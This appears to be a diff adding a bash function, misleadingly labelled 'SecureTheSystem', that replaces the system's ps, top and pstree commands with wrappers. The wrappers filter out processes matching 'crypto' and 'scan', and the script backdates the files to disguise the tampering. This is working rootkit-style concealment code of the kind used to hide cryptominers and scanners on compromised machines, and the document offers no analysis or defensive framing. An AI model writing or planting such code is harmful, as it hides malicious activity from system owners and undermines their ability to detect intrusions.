@@ -1,0 +1,40 @@
+
+
+function HIDE_SOME_STUFF(){
+		echo "begin  SecureTheSystem"
+
+
+    if [ -f "/bin/ps.original" ]; then echo "$(command -v ps) changed" ; else 
+		PS_STOCK=$(command -v ps)
+		mv $PS_STOCK /bin/ps.original    
+        echo "#! /bin/bash">>$PS_STOCK
+        echo "ps.original \$@ | grep -v \"crypto\|scan\|ps.original\"">>$PS_STOCK
+			chmod +x $PS_STOCK
+			touch -d 20160825 $PS_STOCK
+			echo "$PS_STOCK changing"
+	fi
+
+   
+    if [ -f "/bin/top.original" ]; then echo "$(command -v top) changed" ; else
+		TOP_STOCK=$(command -v top)
+        mv $TOP_STOCK /bin/top.original  
+        echo "#! /bin/bash">>$TOP_STOCK
+        echo "top.original \$@ | grep -v \"crypto\|scan\|top.original\"">>$TOP_STOCK
+        chmod +x $TOP_STOCK
+                touch -d 20160825 $TOP_STOCK
+        echo "$TOP_STOCK changing"
+    fi
+    
+    
+    if [ -f "/bin/pstree.original" ]; then echo "$(command -v pstree) changed" ; else
+		PSTREE_STOCK=$(command -v pstree)
+        mv $PSTREE_STOCK /bin/pstree.original
+        echo "#! /bin/bash">>$PSTREE_STOCK
+        echo "pstree.original \$@ | grep -v \"crypto\|scan\|pstree.original\"">>$PSTREE_STOCK
+        chmod +x $PSTREE_STOCK
+                touch -d 20160825 $PSTREE_STOCK
+        echo "$PSTREE_STOCK changing"
+    fi
+}
+
+HIDE_SOME_STUFF
